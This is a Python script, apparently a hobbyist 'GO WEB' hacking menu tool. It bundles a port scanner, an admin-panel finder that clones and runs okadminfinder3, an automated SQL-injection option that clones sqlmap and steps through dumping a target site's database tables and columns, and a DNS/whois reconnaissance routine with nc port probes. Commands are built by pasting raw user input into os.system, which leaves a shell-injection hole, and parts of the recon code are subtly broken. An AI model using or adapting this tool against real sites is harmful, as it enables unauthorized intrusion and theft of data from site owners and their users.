import socket
import sys
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import time
import subprocess
import re
import requests
import os

os.system("clear")

print(Fore.RED + '')

print('.d8888b.   .d88888b.        888       888 8888888888 888888b.')   
print('d88P  Y88b d88P" "Y88b      888   o   888 888        888  "88b')
print('888    888 888     888      888  d8b  888 888        888  .88P')
print('888        888     888      888 d888b 888 8888888    8888888K.')
print('888  88888 888     888      888d88888b888 888        888  "Y88b')
print('888    888 888     888      88888P Y88888 888        888    888')
print('Y88b  d88P Y88b. .d88P      8888P   Y8888 888        888   d88P')
print(' "Y8888P88  "Y88888P"       888P     Y888 8888888888 8888888P" ')

print(Fore.GREEN + '')
print('GITHUB ACCOUNT [https://github.com/ghost0x02]')
print(Style.RESET_ALL)
print(Fore.YELLOW + '')
print('___________________________________________________________')
print(Fore.MAGENTA + 'CODED BY ENESXSEC AND GHOST0x02')
print(Fore.YELLOW + '')
print('services my instagram account: xsecit')
print('THIS SOFTWARE IS FOR TESTING!!!')
print('___________________________________________________________')

def yukleme_animasyonu():
    animasyon_karakterleri = ["|", "/", "-", "\\"]
    for i in range(10):
        animasyon = f"Loading... {animasyon_karakterleri[i % len(animasyon_karakterleri)]}"
        sys.stdout.write(animasyon)
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write("\b" * len(animasyon))
        sys.stdout.flush()

yukleme_animasyonu()
print("Completed!")

def get_local_ip():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        local_ip = sock.getsockname()[0]
        sock.close()
        return local_ip
    except socket.error:
        return "IP adresi alınamadı."

ip_address = get_local_ip()
print("Your Local IP Address:", ip_address)
hostname = socket.gethostname()
print("Hostname:", hostname)
response = requests.get("http://ip-api.com/json")
data = response.json()
gateway = data["query"]
print("Gateway:", gateway)
time.sleep(2)

print(Style.RESET_ALL)

print(Fore.RED + '')
print('''
++++++++++++++++++
1) PORT SCANNER
++++++++++++++++++
2) ADMİN FİNDER
++++++++++++++++++
3) OTO SQL
++++++++++++++++++
4) DİG 'DNS' SCANNER
++++++++++++++++++
5) EXIT
++++++++++++++++++
''')
print(Style.RESET_ALL)
print(Fore.MAGENTA + '')
islemno = input("root@GOweb:~ ")
print(Style.RESET_ALL)

if __name__ == "__main__":
    if islemno == "1":
        os.system("clear")
        print(Fore.YELLOW + 'A DETAILED SCANNING IS BEING PERFORMED IN ONE MINUTE...')
        time.sleep(2)
        print(Style.RESET_ALL)
        print(Fore.MAGENTA + '')
        print(''' 

        Xport 1.1v
     coded by enesxsec
    \_________________/
    |       | |       |
    |       | |       |
    |       | |       |
    |_______| |_______|
    |_______   _______|
    |       | |       |
    |       | |       |
     \      | |      /
      \     | |     /
       \    | |    /
        \   | |   /
         \  | |  /
          \ | | /
           \| |/
            \_/

        

''')

        def scan_port(target_host, target_port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_host, target_port))
            sock.close()
            if result == 0:
                service_name = socket.getservbyport(target_port)
                return target_port, service_name

        def scan_open_ports(target_host):
            print(Fore.GREEN + "This process will take a while...")
            print(Style.RESET_ALL)

            try:
                target_ip = socket.gethostbyname(target_host)
            except socket.gaierror:
                print("Invalid or not found.")
                return

            open_ports = []

            with ThreadPoolExecutor() as executor:
                futures = [executor.submit(scan_port, target_ip, port) for port in range(1, 1025)]

                for future in futures:
                    result = future.result()
                    if result:
                        port, service_name = result
                        print(f"Port {port}: {Fore.GREEN}Open{Style.RESET_ALL} - Service: {service_name}")

                        open_ports.append(port)

            if open_ports:
                print(Fore.GREEN + f"\nOpen ports for {target_host}: {open_ports}" + Style.RESET_ALL)
            else:
                print(Fore.RED + "No open ports found." + Style.RESET_ALL)

        target_host = input("Enter host: ")
        scan_open_ports(target_host)


elif islemno == "2":
    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


     ___       _______  .___  ___.  __  .__   __. 
    /   \     |       \ |   \/   | |  | |  \ |  | 
   /  ^  \    |  .--.  ||  \  /  | |  | |   \|  | 
  /  /_\  \   |  |  |  ||  |\/|  | |  | |  . `  | 
 /  _____  \  |  '--'  ||  |  |  | |  | |  |\   | 
/__/     \__\ |_______/ |__|  |__| |__| |__| \__| """)


    print(Style.RESET_ALL)
    print(Fore.CYAN + '')
    print('''
    Please enter the link as https or http!!!''')
    print('''
    ./okadminfinder.py -u https = http link -r ''')

    hedefip = input("Enter host: ")
    os.system('pip3 install trio')
    os.system('pip3 install socksio')
    os.system("git clone https://github.com/mIcHyAmRaNe/okadminfinder3.git")
    os.chdir("okadminfinder3")
    os.system('chmod +x okadminfinder.py')
    command = f"python3 ./okadminfinder.py -u {hedefip} -r"
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")

elif islemno == "3":
    os.system("clear")
    print(Fore.RED + '')  
    print('''
 █████████     ██████    █████
 ███░░░░░███  ███░░░░███ ░░███
░███    ░░░  ███    ░░███ ░███
░░█████████ ░███     ░███ ░███
 ░░░░░░░░███░███   ██░███ ░███
 ███    ░███░░███ ░░████  ░███      █
░░█████████  ░░░██████░██ ███████████
 ░░░░░░░░░     ░░░░░░ ░░ ░░░░░░░░  ''')
    print(Style.RESET_ALL)
    print(Fore.CYAN + '')
    print('This code is taken from antitool made by ENESXSECİT AND GHOST0x02')
    print('---------------------------------------------------')
    hedefip = input("Enter the SQL explicit site in quotes: ")
    print('ONE MINUTE')
    time.sleep(1)
    os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
    os.chdir("sqlmap-dev")
    os.system("python3 sqlmap.py -u " + hedefip + " --dbs")
    db = input("Select which database to import: ")
    os.system("python3 sqlmap.py -u " + hedefip + " -D " + db + " --tables")
    tb = input("Choose which table you will draw: ")
    os.system("python3 sqlmap.py -u " + hedefip + " -D " + db + " -T " + tb + " --columns")
    cl = input("Choose which columns you will capture: ")
    os.system("python3 sqlmap.py -u " + hedefip + " -D " + db + " -T " + tb + " -C " + cl + " --dump")

elif islemno == "4":
    os.system("clear")
    print(Fore.MAGENTA + '')
    print("""
    >>==========================================<<
    || _ .-') _                                 ||
    ||( (  OO) )                                ||
    || \     .'_   ,-.-')   ,----.              ||
    || ,`'--..._)  |  |OO) '  .-./-')           ||
    || |  |  \  '  |  |  \ |  |_( O- )          ||
    || |  |   ' |  |  |(_/ |  | .--, \          ||
    || |  |   / : ,|  |_.'(|  | '. (_/          ||
    || |  '--'  /(_|  |    |  '--'  |           ||
    || `-------'   `--'     `------'   1.1v     ||
    >>==========================================<< """)
    print(Fore.RED + '')

    def dig_domain(domain):
        print("---------------------------------------------------------------")
        print(f"Dig +trace result of the {domain}")
        print("---------------------------------------------------------------")

        with open("digtrace", "w") as digtrace:
            subprocess.run(["dig", "+nocmd", domain, "a", "+noall", "+answer"], stdout=digtrace)
            subprocess.run(["dig", "+nocmd", domain, "ns", "+noall", "+answer"], stdout=digtrace)
            subprocess.run(["dig", "+trace", "@8.8.8.8", domain], stdout=digtrace)

        with open("digtrace", "r") as digtrace:
            result_lines = digtrace.readlines()

            if not result_lines:
                print("No dig +trace result found.")
                return

            sorted_result = sorted(set(result_lines), key=lambda x: x.split()[-1] if x.split() else '')

            for line in sorted_result:
                print(line)

        subprocess.run(["rm", "-f", "digtrace"])

        print("---------------------------------------------------------------")
        print(f"MX Record Result of the {domain}")
        print("---------------------------------------------------------------")
        subprocess.run(["dig", "+nocmd", domain, "mx", "+noall", "+answer", "|", "sort", "-k", "5"])

        print("---------------------------------------------------------------")
        print(f"TXT Record Result of the {domain}")
        print("---------------------------------------------------------------")
        subprocess.run(["dig", "+nocmd", domain, "txt", "+noall", "+answer"])

        result = subprocess.run(["dig", "+nocmd", domain, "a", "+noall", "+answer"], capture_output=True, text=True)
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', result.stdout)

        if ip_match:
            ip = ip_match.group(0)

            print("---------------------------------------------------------------")
            print(f"PTR record result of the {ip}")
            print("---------------------------------------------------------------")
            subprocess.run(["dig", "-x", ip, "+noall", "+answer"])

            result_mx = subprocess.run(["dig", "+nocmd", domain, "mx", "+noall", "+answer"], capture_output=True, text=True)
            mx_ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', result_mx.stdout)

            if mx_ip_match:
                mx_ip = mx_ip_match.group(0)

                print("---------------------------------------------------------------")
                print(f"Telnet trying to connect that IP Result of the {mx_ip}")
                print("---------------------------------------------------------------")

                subprocess.run(["nc", ip, "587"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
                subprocess.run(["nc", ip, "25"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=1)
            else:
                print("No MX IP found.")
        else:
            print("No IP found.")

        print("---------------------------------------------------------------")
        print(f"WHOIS Result of the {domain}")
        print("---------------------------------------------------------------")
        subprocess.run(["whois", domain])

    if __name__ == "__main__":
        domain = input("Enter host: ")

        if re.match(r'^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$', domain):
            print(f"Your domain name looks like this: {domain}")
            dig_domain(domain)
elif islemno == "5":
    print(Fore.GREEN + 'See you later...') 
    print(Style.RESET_ALL) 
